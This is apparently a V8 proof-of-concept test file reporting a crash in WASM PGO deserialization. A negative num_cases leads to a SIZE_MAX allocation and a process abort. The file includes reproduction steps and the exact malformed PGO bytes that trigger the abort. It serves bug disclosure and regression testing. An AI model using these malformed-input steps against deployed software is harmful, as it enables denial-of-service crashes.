// Copyright 2026 the V8 project authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.
//
// POC: Negative num_cases in WASM PGO deserialization causes SIZE_MAX allocation
//
// BUG: src/wasm/pgo.cc line ~129
//   int num_cases = decoder.consume_i32v("num cases");
//   ...
//   } else {
//     auto* polymorphic = new CallSiteFeedback::PolymorphicCase[num_cases];
//
// When num_cases < 0 (valid signed LEB128 value), the cast to size_t gives
// SIZE_MAX, and new[] tries to allocate SIZE_MAX * sizeof(PolymorphicCase)
// bytes, causing std::terminate() / process abort.
//
// HOW TO REPRODUCE (two steps):
//
// Step 1 - dump the valid PGO file to learn the hash-based filename:
//   out/x64.debug/d8 --experimental-wasm-pgo-to-file poc-pgo-negative-num-cases.js
//   (prints something like: Dumping Wasm PGO data to file 'profile-wasm-abcd1234')
//
// Step 2 - overwrite with malformed PGO (negative num_cases), then load:
//   python3 -c "
//   with open('profile-wasm-XXXXXXXX', 'wb') as f:
//       f.write(bytearray([0x01, 0x00, 0x01, 0x7F]))
//   "
//   out/x64.debug/d8 --experimental-wasm-pgo-from-file poc-pgo-negative-num-cases.js
//
// Replace 'profile-wasm-XXXXXXXX' with the filename printed in Step 1.
//
// CRASH: std::terminate() or abort() in new CallSiteFeedback::PolymorphicCase[SIZE_MAX]
//
// MALFORMED PGO BYTES EXPLANATION:
//   0x01  - num_entries = 1 (one function has feedback)
//   0x00  - func_index = 0 (first declared function)
//   0x01  - feedback_vector_size = 1 (one call-site entry)
//   0x7F  - num_cases = -1 (signed LEB128 for -1, triggers the bug)
//   (no tiering info needed; crash happens before we get there)

d8.file.execute('test/mjsunit/wasm/wasm-module-builder.js');

// Minimal module: one declared function with an empty body.
// (no imports so func_index 0 is the first declared function)
const builder = new WasmModuleBuilder();
builder.addFunction('f', kSig_v_v).addBody([]).exportFunc();
const moduleBytes = builder.toBuffer();
const mod = new WebAssembly.Module(moduleBytes);
new WebAssembly.Instance(mod, {});
